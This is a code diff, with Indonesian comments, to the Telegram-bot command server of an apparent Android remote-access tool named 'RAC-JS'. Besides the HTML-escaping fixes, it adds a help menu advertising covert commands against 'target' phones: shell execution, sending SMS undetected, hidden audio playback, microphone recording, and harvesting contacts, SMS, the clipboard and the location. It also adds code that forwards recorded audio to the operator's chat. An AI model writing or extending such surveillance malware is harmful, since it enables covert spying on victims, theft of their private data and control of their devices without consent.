@@ -103,16 +103,17 @@ const updateDeviceSeen = async (deviceId) => {
 };
 
 // Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
+const escapeHTML = (str) => String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 const formatDeviceResponse = (data) => {
-    if (typeof data === 'string') return `\n└ ${data}`;
+    if (typeof data === 'string') return `\n└ ${escapeHTML(data)}`;
     if (Array.isArray(data)) {
         if (data.length === 0) return '\n└ [Data Kosong]';
-        return '\n' + data.map((item, idx) => `  ${idx + 1}. ` + (typeof item === 'object' ? Object.entries(item).map(([k, v]) => `${k}: ${v}`).join(' | ') : item)).join('\n');
+        return '\n' + data.map((item, idx) => `  ${idx + 1}. ` + (typeof item === 'object' && item !== null ? Object.entries(item).map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`).join(' | ') : escapeHTML(item))).join('\n');
     }
     if (typeof data === 'object' && data !== null) {
-        return '\n' + Object.entries(data).map(([k, v]) => `  • <b>${k}</b>: ${v}`).join('\n');
+        return '\n' + Object.entries(data).map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`).join('\n');
     }
-    return `\n└ ${data}`;
+    return `\n└ ${escapeHTML(data)}`;
 };
 
 // --- TELEGRAM BOT ---
@@ -124,15 +125,50 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
     bot.telegram.setMyCommands([
         { command: 'start', description: 'Lihat menu utama bot' },
         { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
+        { command: 'help', description: 'Bantuan & Daftar Perintah Rahasia' },
         { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
     ]);
+
+    const sendHelpMessage = (ctx) => {
+        const helpText = `
+📖 <b>Daftar Perintah RAC-JS</b>
+
+<b>1. Mode Interaktif (Satu Klik)</b>
+Cukup ketik /list, pilih perangkat, dan tekan tombol:
+📡 Ping | 🎯 Lokasi | 🔋 Baterai | 🔦 Torch 
+📞 Kontak | 📩 Inbox SMS | 🔊 Record Audio
+📻 Info Volume | 🌐 WiFi Scan | 📋 Clipboard
+ℹ️ Info Sistem | ⚙️ Sensor
+
+<b>2. Mode Rahasia (Manual)</b>
+Harus diketik dengan format: 
+<code>/cmd [id_device] [nama_perintah] [teks_opsional]</code>
+
+• <b>show_toast</b> : Memunculkan popup teks di layar target
+• <b>shell</b> : Mengeksekusi perintah terminal Linux/Android
+• <b>set_volume</b> : Mengatur volume (music/ring/alarm/notification) [angka]
+• <b>tts</b> : Berbicara text-to-speech menirukan suara robot
+• <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
+• <b>sms_send</b> : Mengirim SMS dari HP target tanpa ketahuan (Format: <code>Nomor|Pesan</code>)
+• <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi dari URL web
+• <b>record_sound</b> : Merekam mikrofon (Format: argumen dalam mili-detik, cth <code>5000</code>)
+`;
+        ctx.reply(helpText, { parse_mode: 'HTML' });
+    };
+
+    bot.command('help', sendHelpMessage);
+    bot.action('btn_help', async (ctx) => {
+        ctx.answerCbQuery();
+        sendHelpMessage(ctx);
+    });
 
     bot.start((ctx) => {
         const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
         ctx.reply(msg, {
             parse_mode: 'HTML',
             ...Markup.inlineKeyboard([
-                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')]
+                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')],
+                [Markup.button.callback('📖 Bantuan & Dokumentasi', 'btn_help')]
             ])
         });
     });
@@ -151,7 +187,7 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
         devices.forEach(d => {
             const isOnline = (Date.now() / 1000 - d.last_seen) < 60;
             const statusIcon = isOnline ? '🟢' : '🔴';
-            buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev_${d.id}`)]);
+            buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev:${d.id}`)]);
         });
 
         ctx.reply('📱 <b>Pilih Target Perangkat:</b>', {
@@ -161,17 +197,17 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
     };
 
     // Menangani klik dari tombol Device yang dipilih
-    bot.action(/^select_dev_(.+)$/, async (ctx) => {
+    bot.action(/^select_dev:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
         ctx.answerCbQuery();
 
         const menuBtns = [
-            [Markup.button.callback('📡 Ping', `runcmd_${devId}_ping`), Markup.button.callback('🎯 Lokasi', `runcmd_${devId}_location`)],
-            [Markup.button.callback('🔋 Baterai', `runcmd_${devId}_get_battery`), Markup.button.callback('🔦 Torch', `runcmd_${devId}_torch`)],
-            [Markup.button.callback('📞 Kontak', `runcmd_${devId}_contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd_${devId}_sms_list`)],
-            [Markup.button.callback('🔊 Record Audio', `runcmd_${devId}_record_sound`), Markup.button.callback('📻 Info Volume', `runcmd_${devId}_get_volume`)],
-            [Markup.button.callback('🌐 WiFi Scan', `runcmd_${devId}_wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd_${devId}_clipboard`)],
-            [Markup.button.callback('ℹ️ Info Sistem', `runcmd_${devId}_get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd_${devId}_sensors`)]
+            [Markup.button.callback('📡 Ping', `runcmd:${devId}:ping`), Markup.button.callback('🎯 Lokasi', `runcmd:${devId}:location`)],
+            [Markup.button.callback('🔋 Baterai', `runcmd:${devId}:get_battery`), Markup.button.callback('🔦 Torch', `runcmd:${devId}:torch`)],
+            [Markup.button.callback('📞 Kontak', `runcmd:${devId}:contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd:${devId}:sms_list`)],
+            [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
+            [Markup.button.callback('🌐 WiFi Scan', `runcmd:${devId}:wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)],
+            [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)]
         ];
 
         ctx.reply(`🎯 <b>Perangkat Terpilih:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`, {
@@ -181,7 +217,7 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
     });
 
     // Menangani klik perintah spesifik dari device
-    bot.action(/^runcmd_(.+)_(.+)$/, async (ctx) => {
+    bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
         const cmdName = ctx.match[2];
         ctx.answerCbQuery(`Menjalankan ${cmdName}...`);
@@ -274,6 +310,16 @@ app.post('/response', async (req, res) => {
             const cmd = await db.get('SELECT chat_id FROM commands WHERE id = ?', [data.id]);
             if (cmd && cmd.chat_id && bot) {
                 const deviceResponse = data.data !== undefined ? data.data : data;
+
+                if (data.type === 'audio_base64') {
+                    const audioBuffer = Buffer.from(deviceResponse, 'base64');
+                    await bot.telegram.sendAudio(cmd.chat_id, {
+                        source: audioBuffer,
+                        filename: `record_${data.id}.3gp`
+                    }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
+                    return res.json({ status: 'received' });
+                }
+
                 const jsonString = JSON.stringify(deviceResponse, null, 2);
 
                 // Jika ukuran pesan melebihi limit Telegram (4096 char), kirim sebagai file JSON
@@ -282,10 +328,10 @@ app.post('/response', async (req, res) => {
                     await bot.telegram.sendDocument(cmd.chat_id, {
                         source: buffer,
                         filename: `response_${data.id}.json`
-                    }, { caption: `✅ <b>Respon dari alat (${client_id}):</b> Payload terlalu besar, dikirim sebagai file.`, parse_mode: 'HTML' });
+                    }, { caption: `✅ <b>Respon dari alat (${escapeHTML(client_id)}):</b> Payload terlalu besar, dikirim sebagai file.`, parse_mode: 'HTML' });
                 } else {
                     const formattedDisplay = formatDeviceResponse(deviceResponse);
-                    const replyMessage = `✅ <b>Respon Eksekusi [${client_id}]:</b>\n${formattedDisplay}`;
+                    const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
                     await bot.telegram.sendMessage(cmd.chat_id, replyMessage, { parse_mode: 'HTML' });
                 }
             }
